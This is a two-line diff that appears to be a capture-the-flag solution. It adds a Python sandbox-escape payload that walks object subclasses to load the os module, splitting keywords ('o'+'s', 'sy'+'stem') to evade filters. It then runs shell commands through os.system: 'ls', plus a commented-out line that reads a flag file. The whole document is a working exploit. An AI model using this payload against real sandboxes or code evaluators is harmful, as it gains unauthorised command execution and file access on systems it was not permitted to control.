@@ -1,0 +1,2 @@
+# print(().__class__.__mro__[1].__subclasses__()[84]().load_module('o'+'s').__dict__['sy'+'stem']('cat flag-c2ebfbe5-b8bf-43a2-ad79-34ae54a2e53b.txt'))
+print(().__class__.__mro__[1].__subclasses__()[84]().load_module('o'+'s').__dict__['sy'+'stem']('ls'))
